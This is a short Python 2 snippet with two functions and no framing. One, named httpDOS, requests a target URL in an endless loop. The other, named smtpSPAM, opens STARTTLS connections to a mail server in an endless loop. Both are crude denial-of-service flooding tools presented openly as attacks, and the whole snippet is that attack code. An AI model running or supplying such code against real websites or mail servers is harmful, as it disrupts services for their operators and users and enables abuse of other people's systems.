

def httpDOS(url):
	while 1:
		try:
			import urllib2
			urllib2.urlopen(url)
		except:	
			print "Website not available"


def smtpSPAM(address, port):
	import smtplib
	while 1:

		try:
			smtpServ = smtplib.SMTP(address, port)
			smtpServ.ehlo()
			smtpServ.starttls()
			smtpServ.ehlo()
		except:
			print "Server Connection Unavailable"

